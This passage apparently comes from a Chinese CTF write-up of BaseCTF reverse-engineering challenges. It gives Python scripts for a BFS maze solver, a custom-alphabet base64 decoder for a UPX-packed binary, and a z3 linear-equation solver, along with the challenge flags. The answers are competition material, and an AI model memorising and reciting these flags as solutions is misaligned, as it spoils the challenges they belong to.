src="/./img/49277317_FB7BapPnN5N9nCVR/1723720955778-8eb1ac27-68ef-416c-b585-8d69be929de4-752799.png" alt="1723720955778-8eb1ac27-68ef-416c-b585-8d69be929de4.png"></p><p>到y就是胜利，$,ord为36是invalidmovehit，不能移动</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723721240184-ec5eb2fe-eaaa-4e59-9247-f8636ba23759-367351.png" alt="1723721240184-ec5eb2fe-eaaa-4e59-9247-f8636ba23759.png"></p><p><font style="color:#DF2A3F;">15x15的迷宫</font></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723721440417-9f2cd484-e12c-4011-9a01-396a79c504d1-593715.png" alt="1723721440417-9f2cd484-e12c-4011-9a01-396a79c504d1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs plain">from collections import deque<br># str为ida中使用快捷键[shift+e]提取到的数据, 如果提取的是string literal则加上引号视作字符串，如果是C array(decimal)则加上中括号视作列表<br>str = [<br><br>    120, 36, 36, 36, 36, 36, 36, 36, 36, 36,<br>    36, 36, 36, 36, 36, 38, 38, 38, 38, 38,<br>    38, 36, 36, 36, 36, 36, 36, 36, 36, 36,<br>    38, 36, 38, 36, 36, 38, 36, 36, 38, 38,<br>    38, 38, 38, 36, 36, 38, 36, 38, 36, 36,<br>    36, 38, 38, 36, 36, 36, 36, 38, 36, 36,<br>    38, 36, 36, 36, 38, 38, 38, 36, 36, 36,<br>    36, 36, 38, 36, 36, 38, 36, 36, 36, 38,<br>    36, 38, 38, 36, 38, 36, 36, 36, 36, 36,<br>    38, 36, 36, 36, 38, 36, 38, 36, 36, 38,<br>    38, 38, 36, 36, 36, 38, 38, 38, 38, 38,<br>    36, 38, 38, 38, 38, 36, 38, 36, 36, 36,<br>    36, 36, 36, 36, 36, 36, 38, 38, 38, 38,<br>    38, 38, 36, 36, 36, 36, 36, 36, 36, 36,<br>    36, 38, 36, 36, 36, 36, 36, 36, 36, 36,<br>    36, 36, 36, 38, 38, 38, 38, 36, 36, 38,<br>    38, 38, 36, 36, 36, 36, 36, 36, 38, 38,<br>    38, 38, 38, 38, 38, 36, 36, 36, 36, 36,<br>    36, 36, 36, 36, 36, 36, 36, 36, 36, 38,<br>    36, 36, 38, 36, 36, 36, 36, 36, 36, 36,<br>    36, 36, 36, 36, 38, 36, 38, 36, 36, 36,<br>    36, 36, 36, 36, 36, 36, 38, 38, 38, 38,<br>    38, 38, 38, 38, 121<br>]<br>s = 0  # s用作索引访问str, 供下面tmp列表取值<br><br># 分析题目后设置迷宫的行列<br>row = 15 # 设置二维迷宫行数<br>col = 15 # 设置二维迷宫列数<br><br>maze = []<br>for i in range(row):<br>    tmp = []<br>    for j in range(col):<br>        tmp.append(str[s])<br>        s += 1<br>    maze.append(tmp)  # 凑一行添加一行到迷宫中<br>print(maze)<br># 设置二维四向迷宫, 如果题目是多个小迷宫问题, 拆分多次调用脚本获取路径即可<br>path_len = 0x7fffffff  # 如果题目未给出终点坐标，则一定会指定路径的长度，在此处修改路径长度并+1，否则请保留path_len的极大值 0x7fffffff<br><br><br># 进行BFS寻找路径<br>def bfs(start, end, barrier):<br>    directions = [(0, 1), (1, 0), (0, -1), (-1, 0)]  # 定义四个方向的移动<br>    for i in range(len(maze)):  # 获取起点和终点在列表中的索引<br>        for j in range(len(maze[i])):<br>            if (maze[i][j] == start):<br>                start = (i, j)<br>            if (maze[i][j] == end):<br>                end = (i, j)<br>    # 以下均是bfs算法套路<br>    queue = deque()<br>    queue.append((start, [start]))  # (当前位置, 路径)<br>    visited = set()<br>    visited.add(start)<br>    while queue:<br>        position, path = queue.popleft()<br>        if position == end:<br>            return path<br>        elif len(path) == path_len:<br>            return path<br>        for d in directions:<br>            next_position = (position[0] + d[0], position[1] + d[1])<br>            if 0 &lt;= next_position[0] &lt; len(maze) and 0 &lt;= next_position[1] &lt; len(maze[0]) and \<br>                    maze[next_position[0]][next_position[1]] != barrier and next_position not in visited:<br>                queue.append((next_position, path + [next_position]))<br>                visited.add(next_position)<br>    return None<br><br><br># 执行BFS搜索并打印结果<br>if __name__ == &#x27;__main__&#x27;:<br>    # maze[起点x坐标][起点y坐标] = &#x27;S&#x27; #如果题目给了起点终点的坐标，在这里直接给起点和终点添加特征<br>    # maze[终点x坐标][终点y坐标] = &#x27;E&#x27;<br><br>    path = bfs(120, 121, 36)  # bfs函数传入参数代表起点、终点、障碍的特征(若题目给出的数据无特征, 手动添加特征即可, 通常障碍是1也有可能是0或其它字符如&#x27;#&#x27;)<br>    print(&quot;移动路径坐标：&quot;, path)<br>    print(&quot;移动路径方位：&quot;, end=&#x27;&#x27;)<br>    for i in range(1, len(path)):<br>        x1, y1, x2, y2 = path[i - 1][0], path[i - 1][1], path[i][0], path[i][1]<br>        if (x1 &gt; x2):  # 上<br>            print(&quot;w&quot;, end=&#x27;&#x27;)<br>        elif (x1 &lt; x2):  # 下<br>            print(&quot;s&quot;, end=&#x27;&#x27;)<br>        elif (y1 &gt; y2):  # 左<br>            print(&quot;a&quot;, end=&#x27;&#x27;)<br>        elif (y1 &lt; y2):  # 右<br>            print(&quot;d&quot;, end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723725020955-fb895653-e442-4383-b500-fd27029cb6d1-773066.png" alt="1723725020955-fb895653-e442-4383-b500-fd27029cb6d1.png"></p><p>BaseCTF{131b7d6e60e8a34cb01801ae8de07efe}</p><h2 id="Baseplus"><a href="#Baseplus" class="headerlink" title="Baseplus"></a>Baseplus</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723792333054-25615cc1-9fb2-4804-a0fd-d51148e4eeb4-656239.png" alt="1723792333054-25615cc1-9fb2-4804-a0fd-d51148e4eeb4.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1723792371314-8a8d272b-ad4c-4e7e-b87f-18c0989873c6-500040.png" alt="1723792371314-8a8d272b-ad4c-4e7e-b87f-18c0989873c6.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724039671519-b818d7e1-7edf-4272-b703-9687559fba96-782093.png" alt="1724039671519-b818d7e1-7edf-4272-b703-9687559fba96.png"></p><p>先进行base64然后xor</p><p>所以反过来解码就行</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724039788793-5ae8b15e-3993-4658-86d3-2fef8743f494-709040.png" alt="1724039788793-5ae8b15e-3993-4658-86d3-2fef8743f494.png"></p><h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX"></a>UPX</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724927341548-f8ff8e93-dddd-47e0-b72a-ca5f00289136-510535.png" alt="1724927341548-f8ff8e93-dddd-47e0-b72a-ca5f00289136.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724927606635-38ab506f-bb39-4901-bedf-f7a07da08e17-784670.png" alt="1724927606635-38ab506f-bb39-4901-bedf-f7a07da08e17.png"></p><p>可能改了一些东西</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724927989037-69da9568-4f34-421c-9a3b-5637bdfaf346-556971.png" alt="1724927989037-69da9568-4f34-421c-9a3b-5637bdfaf346.png"></p><p>将小写改成大写就可以脱壳了</p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724928130673-24441937-b80d-4c8b-93ac-685897db8502-684701.png" alt="1724928130673-24441937-b80d-4c8b-93ac-685897db8502.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724928152970-51119154-c262-4d49-a4e5-69d3dc49dc81-834814.png" alt="1724928152970-51119154-c262-4d49-a4e5-69d3dc49dc81.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724929366218-495fa013-d99c-439f-a11c-3bd0b1bf829a-260050.png" alt="1724929366218-495fa013-d99c-439f-a11c-3bd0b1bf829a.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64<br><br><br>def custom_base64_decode(encoded_string, custom_chars):<br>    # 创建一个映射表，将自定义字符映射到标准 Base64 字符<br>    standard_chars = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;<br>    translation_table = str.maketrans(custom_chars, standard_chars)<br><br>    # 转换自定义 Base64 字符串为标准 Base64 字符串<br>    standard_encoded_string = encoded_string.translate(translation_table)<br><br>    # 进行 Base64 解码<br>    decoded_bytes = base64.b64decode(standard_encoded_string)<br><br>    # 将解码后的字节转换为字符串<br>    return decoded_bytes.decode(&#x27;utf-8&#x27;)<br><br><br># 示例使用<br>encoded_string = &quot;$rg7_dhd~Alidg+zeyhz`vnz_d,7sy0=&quot;<br>custom_chars = &#x27;A,.1fgvw#`/2ehux$~&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noX&#x27;  # 示例自定义字符集<br><br># 解码<br>decoded_string = custom_base64_decode(encoded_string, custom_chars)<br><br># 输出结果<br>print(&quot;解码结果:&quot;, decoded_string)<br>#BaseCTF&#123;UPX_1s_$o_e@sy&#125;<br></code></pre></td></tr></table></figure><h2 id="lk"><a href="#lk" class="headerlink" title="lk"></a>lk</h2><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724931762695-32bc1293-4335-4936-be60-0c5937f0fb7b-106963.png" alt="1724931762695-32bc1293-4335-4936-be60-0c5937f0fb7b.png"></p><p><img src="/./img/49277317_FB7BapPnN5N9nCVR/1724932198797-893f2796-4b86-4ffa-a41d-2e64c3054c6a-696374.png" alt="1724932198797-893f2796-4b86-4ffa-a41d-2e64c3054c6a.png"></p><p>改为2**9</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br></pre></td><td class="code"><pre><code class="hljs plain">from z3 import *<br>s = Solver()<br>v1,v2,v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18,v19,v20 = Ints(&quot;v1 v2 v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18 v19 v20&quot;)<br>s.add(948 * v20+ 887 * v19+ 410 * v18+ 978 * v17+ 417 * v16+ 908 * v15 + 965 * v14+ 987 * v13<br>+ 141 * v12+ 257 * v11+ 323 * v10+ 931 * v9+ 773 * v8 + 851 * v7+ 758 * v6+ 891 *v5+ 575 * v4<br>+ 616 * v3+ 860 * v2+ 283 * v1 == 913686)<br>s.add(938 * v20+ 490 * v19+ 920 * v18+ 50 * v17+ 568 * v16+ 68 * v15+ 35 * v14+ 708 * v13+ 938 * v12<br>+ 718 * v11+ 589 * v10+ 954 * v9+ 974 * v8+ 62 * v7+ 580 * v6+ 80 * v5+ 111 * v4+ 151 * v3<br>+ 421 * v2+ 148 * v1 == 630335)<br>s.add(908 * v20+ 590 * v19+ 668 * v18+ 222 * v17+ 489 * v16+ 335 * v15+ 778 * v14+ 622 * v13+ 95 * v12<br>+ 920 * v11+ 932 * v10+ 892 * v9+ 409 * v8+ 392 * v7+ 11 * v6+ 113 * v5+ 948 * v4+ 674 * v3<br>+ 506 * v2+ 182 * v1== 707525)<br>s.add( 479 * v20+ 859 * v19+ 410 * v18+ 399 * v17+ 891 * v16+ 266 * v15+ 773 * v14+ 624 * v13<br>+ 34 * v12+ 479 * v11+ 465 * v10+ 728 * v9+ 447 * v8+ 427 * v7+ 890 * v6+ 570 * v5+ 716 * v4<br>+ 180 * v3+ 571 * v2+ 707 * v1 == 724203)<br>s.add(556 * v20+ 798 * v19+ 380 * v18+ 716 * v17+ 71 * v16+ 901 * v15+ 949 * v14+ 304 * v13<br>+ 142 * v12+ 679 * v11+ 459 * v10+ 814 * v9+ 282 * v8+ 49 * v7+ 873 * v6+ 169 * v5+ 437 * v4<br>+ 199 * v3+ 771 * v2+ 807 * v1== 688899)<br>s.add(465 * v20<br>     + 898 * v19<br>     + 979 * v18<br>     + 198 * v17<br>     + 156 * v16<br>     + 831 * v15<br>     + 856 * v14<br>     + 322 * v13<br>     + 25 * v12<br>     + 35 * v11<br>     + 369 * v10<br>     + 917 * v9<br>     + 522 * v8<br>     + 654 * v7<br>     + 235 * v6<br>     + 385 * v5<br>     + 469 * v4<br>     + 231 * v3<br>     + 496 * v2<br>     + 83 * v1 == 604784)<br>s.add(305 * v20<br>     + 928 * v19<br>     + 260 * v18<br>     + 793 * v17<br>     + 787 * v16<br>     + 708 * v15<br>     + 758 * v14<br>     + 236 * v13<br>     + 688 * v12<br>     + 747 * v11<br>     + 711 * v10<br>     + 195 * v9<br>     + 50 * v8<br>     + 648 * v7<br>     + 787 * v6<br>     + 376 * v5<br>     + 220 * v4<br>     + 33 * v3<br>     + 194 * v2<br>     + 585 * v1 == 665485)<br>s.add(767 * v20<br>     + 573 * v19<br>     + 22 * v18<br>     + 909 * v17<br>     + 598 * v16<br>     + 588 * v15<br>     + 136 * v14<br>     + 848 * v12<br>     + 964 * v11<br>     + 311 * v10<br>     + 701 * v9<br>     + 653 * v8<br>     + 541 * v7<br>     + 443 * v6<br>     + 7 * v5<br>     + 976 * v4<br>     + 803 * v3<br>     + 273 * v2<br>     + 859 * v1 == 727664)<br>s.add(776 * v20<br>     + 59 * v19<br>     + 507 * v18<br>     + 164 * v17<br>     + 397 * v16<br>     + 744 * v15<br>     + 377 * v14<br>     + 768 * v13<br>     + 456 * v12<br>     + 799 * v11<br>     + 9 * v10<br>     + 215 * v9<br>     + 365 * v8<br>     + 181 * v7<br>     + 634 * v6<br>     + 818 * v5<br>     + 81 * v4<br>     + 236 * v3<br>     + 883 * v2<br>     + 95 * v1 == 572015)<br>s.add(873 * v20<br>     + 234 * v19<br>     + 381 * v18<br>     + 423 * v17<br>     + 960 * v16<br>     + 689 * v15<br>     + 617 * v14<br>     + 240 * v13<br>     + 933 * v12<br>     + 300 * v11<br>     + 998 * v10<br>     + 773 * v9<br>     + 484 * v8<br>     + 905 * v7<br>     + 806 * v6<br>     + 792 * v5<br>     + 606 * v4<br>     + 942 * v3<br>     + 422 * v2<br>     + 789 * v1 == 875498)<br>s.add(766 * v20<br>     + 7 * v19<br>     + 283 * v18<br>     + 900 * v17<br>     + 211 * v16<br>     + 305 * v15<br>     + 343 * v14<br>     + 696 * v13<br>     + 590 * v12<br>     + 736 * v11<br>     + 817 * v10<br>     + 603 * v9<br>     + 414 * v8<br>     + 828 * v7<br>     + 114 * v6<br>     + 845 * v5<br>     + 175 * v4<br>     + 212 * v3<br>     + 898 * v2<br>     + 988 * v1 == 714759)<br>s.add(220 * v20<br>     + 30 * v19<br>     + 788 * v18<br>     + 106 * v17<br>     + 574 * v16<br>     + 501 * v15<br>     + 366 * v14<br>     + 952 * v13<br>     + 121 * v12<br>     + 996 * v11<br>     + 735 * v10<br>     + 689 * v9<br>     + 998 * v8<br>     + 689 * v7<br>     + 729 * v6<br>     + 886 * v5<br>     + 860 * v4<br>     + 70 * v3<br>     + 466 * v2<br>     + 961 * v1 == 778853)<br>s.add(313 * v20<br>     + 748 * v19<br>     + 522 * v18<br>     + 864 * v17<br>     + 156 * v16<br>     + 362 * v15<br>     + 283 * v14<br>     + 49 * v13<br>     + 316 * v12<br>     + 79 * v11<br>     + 136 * v10<br>     + 299 * v9<br>     + 271 * v8<br>     + 604 * v7<br>     + 907 * v6<br>     + 540 * v5<br>     + 141 * v4<br>     + 620 * v3<br>     + 701 * v2<br>     + 866 * v1 == 584591)<br>s.add(922 * v20<br>     + 399 * v19<br>     + 425 * v18<br>     + 26 * v17<br>     + 159 * v16<br>     + 224 * v15<br>     + 438 * v14<br>     + 770 * v13<br>     + 144 * v12<br>     + 406 * v11<br>     + 110 * v10<br>     + 991 * v9<br>     + 749 * v8<br>     + 701 * v7<br>     + 646 * v6<br>     + 147 * v5<br>     + 979 * v4<br>     + 674 * v3<br>     + 999 * v2<br>     + 913 * v1 == 717586)<br>s.add(13 * v20<br>     + 537 * v19<br>     + 225 * v18<br>     + 421 * v17<br>     + 153 * v16<br>     + 484 * v15<br>     + 654 * v14<br>     + 743 * v13<br>     + 779 * v12<br>     + 74 * v11<br>     + 325 * v10<br>     + 439 * v9<br>     + 797 * v8<br>     + 41 * v7<br>     + 784 * v6<br>     + 269 * v5<br>     + 454 * v4<br>     + 725 * v2<br>     + 164 * v1 == 537823)<br>s.add(591 * v20<br>     + 210 * v19<br>     + 874 * v18<br>     + 204 * v17<br>     + 485 * v16<br>     + 42 * v15<br>     + 433 * v14<br>     + 176 * v13<br>     + 436 * v12<br>     + 634 * v11<br>     + 82 * v10<br>     + 978 * v9<br>     + 818 * v8<br>     + 683 * v7<br>     + 404 * v6<br>     + 562 * v5<br>     + 41 * v4<br>     + 789 * v3<br>     + 200 * v2<br>     + 220 * v1 == 587367)<br>s.add(584 * v20<br>     + 597 * v19<br>     + 928 * v18<br>     + 532 * v17<br>     + 902 * v16<br>     + 858 * v15<br>     + 820 * v14<br>     + 240 * v13<br>     + 124 * v12<br>     + 899 * v11<br>     + 848 * v10<br>     + 822 * v9<br>     + 409 * v8<br>     + 491 * v7<br>     + 587 * v6<br>     + 715 * v5<br>     + 410 * v4<br>     + 268 * v3<br>     + 721 * v2<br>     + 915 * v1 == 842245)<br>s.add(421 * v20<br>     + 302 * v19<br>     + 327 * v18<br>     + 180 * v17<br>     + 512*v16<br>     + 160 * v15<br>     + 623 * v14<br>     + 28 * v13<br>     + 411 * v12<br>     + 53 * v11<br>     + 633 * v10<br>     + 560 * v9<br>     + 623 * v8<br>     + 477 * v7<br>     + 901 * v6<br>     + 287 * v5<br>     + 149 * v4<br>     + 726 * v3<br>     + 934 * v2<br>     + 875 * v1 == 610801)<br>s.add(838 * v20<br>     + 434 * v19<br>     + 792 * v18<br>     + 649 * v17<br>     + 462 * v16<br>     + 170 * v15<br>     + 980 * v14<br>     + 15 * v13<br>     + 295 * v12<br>     + 495 * v11<br>     + 666 * v10<br>     + 934 * v9<br>     + 17 * v8<br>     + 69 * v7<br>     + 367 * v6<br>     + 780 * v5<br>     + 291 * v4<br>     + 834 * v3<br>     + 587 * v2<br>     + 133 * v1 == 653127)<br>s.add( 41 * v20<br>     + 422 * v19<br>     + 420 * v18<br>     + 224 * v17<br>     + 475 * v16<br>     + 854 * v15<br>     + 233 * v14<br>     + 179 * v13<br>     + 620 * v12<br>     + 69 * v11<br>     + 42 * v10<br>     + 684 * v9<br>     + 300 * v8<br>     + 745 * v7<br>     + 894 * v6<br>     + 554 * v5<br>     + 495 * v4<br>     + 66 * v3<br>     + 316 * v2<br>     + 391 * v1 == 533470)<br><br>flag=[]<br>if s.check() == sat:<br>    ans=s.model()<br>    flag.append(ans[v1])<br>    flag.append(ans[v2])<br>    flag.append(ans[v3])<br>    flag.append(ans[v4])<br>    flag.append(ans[v5])<br>    flag.append(ans[v6])<br>    flag.append(ans[v7])<br>    flag.append(ans[v8])<br>    flag.append(ans[v9])<br>    flag.append(ans[v10])<br>    flag.append(ans[v11])<br>    flag.append(ans[v12])<br>    flag.append(ans[v13])<br>    flag.append(ans[v14])<br>    flag.append(ans[v15])<br>    flag.append(ans[v16])<br>    flag.append(ans[v17])<br>    flag.append(ans[v18])<br>    flag.append(ans[v19])<br>    flag.append(ans[v20])<br><br><br>for x in flag:<br>    print(x,end=&#x27;,&#x27;)<br>flag=[67,68,66,66,68,67,65,65,65,66,66,68,66,67,67,66,67,67,65,67]<br>for i in flag:<br>    print(chr(i),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h1 